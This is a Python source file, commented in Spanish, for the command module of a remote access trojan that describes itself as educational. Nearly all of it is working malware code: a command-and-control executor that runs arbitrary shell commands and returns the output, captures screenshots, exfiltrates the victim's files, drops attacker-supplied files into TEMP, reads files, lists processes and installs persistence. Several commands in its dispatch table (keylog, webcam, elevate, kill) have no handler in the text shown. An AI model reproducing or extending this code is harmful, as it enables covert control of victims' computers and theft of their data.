"""
Módulo de comandos - Ejecución de acciones remotas
Propósito educativo: Entender capacidades típicas de RATs
"""

import os
import io
import sys
import subprocess
import shutil
import ctypes
from PIL import Image
import asyncio


class CommandExecutor:
    """
    Clase 5: Ejecutor de comandos remotos
    """
    
    def __init__(self, c2_client):
        self.c2 = c2_client
        self.running = True
        self.active_tasks = {}
    
    async def process_queue(self):
        """Procesa cola de comandos asíncronamente"""
        while self.running:
            try:
                cmd_data = await asyncio.wait_for(
                    self.c2.command_queue.get(), 
                    timeout=1.0
                )
                await self.execute(cmd_data)
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                await self.c2.send_message(f"Error: {str(e)}")
    
    async def execute(self, cmd_data):
        """Ejecuta comando específico"""
        command = cmd_data['command']
        args = cmd_data['args']
        message = cmd_data['message']
        
        handlers = {
            'help': self.cmd_help,
            'info': self.cmd_info,
            'shell': self.cmd_shell,
            'screenshot': self.cmd_screenshot,
            'download': self.cmd_download,
            'upload': self.cmd_upload,
            'ls': self.cmd_list,
            'cd': self.cmd_cd,
            'pwd': self.cmd_pwd,
            'cat': self.cmd_cat,
            'rm': self.cmd_rm,
            'mkdir': self.cmd_mkdir,
            'processes': self.cmd_processes,
            'kill': self.cmd_kill,
            'webcam': self.cmd_webcam,
            'record': self.cmd_record,
            'keylog': self.cmd_keylog,
            'persist': self.cmd_persist,
            'elevate': self.cmd_elevate,
            'shutdown': self.cmd_shutdown,
            'reboot': self.cmd_reboot,
            'exit': self.cmd_exit
        }
        
        handler = handlers.get(command, self.cmd_unknown)
        await handler(args, message)
    
    async def cmd_help(self, args, message):
        """Muestra ayuda de comandos disponibles"""
        help_text = """
**Comandos disponibles:**

📁 **Navegación:**
`!ls [ruta]` - Listar archivos
`!cd <ruta>` - Cambiar directorio  
`!pwd` - Directorio actual
`!cat <archivo>` - Ver contenido

📥 **Transferencia:**
`!download <archivo>` - Descargar archivo
`!upload` (con adjunto) - Subir archivo

📸 **Captura:**
`!screenshot` - Captura de pantalla
`!webcam` - Foto de webcam
`!record <segundos>` - Grabar audio

⚙️ **Sistema:**
`!shell <comando>` - Ejecutar comando shell
`!processes` - Listar procesos
`!kill <pid>` - Terminar proceso
`!info` - Información del sistema

🔧 **Persistencia:**
`!persist` - Establecer persistencia
`!elevate` - Intentar elevación de privilegios

🔄 **Control:**
`!shutdown` - Apagar sistema
`!reboot` - Reiniciar sistema
`!exit` - Cerrar sesión RAT
        """
        await self.c2.send_message(help_text)
    
    async def cmd_info(self, args, message):
        """Muestra información del sistema"""
        from .intelligence import IntelligenceCollector
        collector = IntelligenceCollector()
        info = collector.collect_all()
        await self.c2.send_system_info(info)
    
    async def cmd_shell(self, args, message):
        """Ejecuta comando en shell"""
        if not args:
            await self.c2.send_message("Uso: !shell <comando>")
            return
        
        command = ' '.join(args)
        
        try:
            # Ejecutar con timeout
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), 
                timeout=30
            )
            
            output = stdout.decode('utf-8', errors='ignore')
            errors = stderr.decode('utf-8', errors='ignore')
            
            result = f"**Comando:** `{command}`\n"
            if output:
                result += f"**Salida:**\n```{output[:1900]}```"
            if errors:
                result += f"\n**Errores:**\n```{errors[:500]}```"
            
            await self.c2.send_message(result)
            
        except asyncio.TimeoutError:
            await self.c2.send_message("⏱️ Comando excedió tiempo límite")
        except Exception as e:
            await self.c2.send_message(f"❌ Error: {str(e)}")
    
    async def cmd_screenshot(self, args, message):
        """Captura pantalla"""
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = img_buffer.getvalue()
            
            await self.c2.send_screenshot(img_data)
            
        except Exception as e:
            await self.c2.send_message(f"❌ Error captura: {str(e)}")
    
    async def cmd_download(self, args, message):
        """Descarga archivo de la víctima"""
        if not args:
            await self.c2.send_message("Uso: !download <ruta_archivo>")
            return
        
        file_path = ' '.join(args)
        file_path = os.path.expandvars(file_path)
        
        if not os.path.exists(file_path):
            await self.c2.send_message(f"❌ Archivo no existe: {file_path}")
            return
        
        await self.c2.send_file(file_path)
    
    async def cmd_upload(self, args, message):
        """Recibe archivo del atacante"""
        if not message.attachments:
            await self.c2.send_message("❌ Adjunta un archivo")
            return
        
        attachment = message.attachments[0]
        
        # Validar extensión peligrosa (protección)
        dangerous = ['.exe', '.dll', '.bat', '.ps1', '.vbs', '.scr']
        if any(attachment.filename.lower().endswith(ext) for ext in dangerous):
            await self.c2.send_message("⚠️ Extensión no permitida")
            return
        
        download_path = os.path.join(
            os.getenv('TEMP'),
            attachment.filename
        )
        
        await attachment.save(download_path)
        await self.c2.send_message(
            f"✅ Archivo guardado en: `{download_path}`"
        )
    
    async def cmd_list(self, args, message):
        """Lista archivos en directorio"""
        path = args[0] if args else '.'
        path = os.path.expandvars(path)
        
        try:
            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                size = os.path.getsize(full_path) if os.path.isfile(full_path) else 0
                item_type = "📄" if os.path.isfile(full_path) else "📁"
                items.append(f"{item_type} {item} ({size} bytes)")
            
            result = f"**Contenido de:** `{os.path.abspath(path)}`\n"
            result += '\n'.join(items[:50])  # Limitar
            await self.c2.send_message(f"```{result[:1900]}```")
            
        except Exception as e:
            await self.c2.send_message(f"❌ Error: {str(e)}")
    
    async def cmd_cd(self, args, message):
        """Cambia directorio"""
        if not args:
            await self.c2.send_message("Uso: !cd <ruta>")
            return
        
        path = ' '.join(args)
        path = os.path.expandvars(path)
        
        try:
            os.chdir(path)
            await self.c2.send_message(f"📁 Directorio: `{os.getcwd()}`")
        except Exception as e:
            await self.c2.send_message(f"❌ Error: {str(e)}")
    
    async def cmd_pwd(self, args, message):
        """Muestra directorio actual"""
        await self.c2.send_message(f"📁 `{os.getcwd()}`")
    
    async def cmd_cat(self, args, message):
        """Muestra contenido de archivo"""
        if not args:
            await self.c2.send_message("Uso: !cat <archivo>")
            return
        
        file_path = ' '.join(args)
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            await self.c2.send_message(f"```{content[:1900]}```")
        except Exception as e:
            await self.c2.send_message(f"❌ Error: {str(e)}")
    
    async def cmd_processes(self, args, message):
        """Lista procesos en ejecución"""
        try:
            import psutil
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    info = proc.info
                    processes.append(
                        f"{info['pid']}: {info['name']} ({info['username']})"
                    )
                except:
                    pass
            
            result = "**Procesos activos:**\n"
            result += '\n'.join(processes[:50])
            await self.c2.send_message(f"```{result[:1900]}```")
            
        except Exception as e:
            await self.c2.send_message(f"❌ Error: {str(e)}")
    
    async def cmd_persist(self, args, message):
        """Establece persistencia"""
        from .persistence import PersistenceManager
        pm = PersistenceManager()
        results = pm.establish_all()
        
        status = '\n'.join([f"{k}: {'✅' if v else '❌'}" 
                          for k, v in results.items()])
        await self.c2.send_message(f"**Persistencia:**\n```{status}```")
    
    async def cmd_exit(self, args, message):
        """Cierra sesión RAT"""
        await self.c2.send_message("👋 Cerrando sesión...")
        self.running = False
    
    async def cmd_unknown(self, args, message):
        """Comando no reconocido"""
        await self.c2.send_message(f"❓ Comando desconocido. Usa `!help`")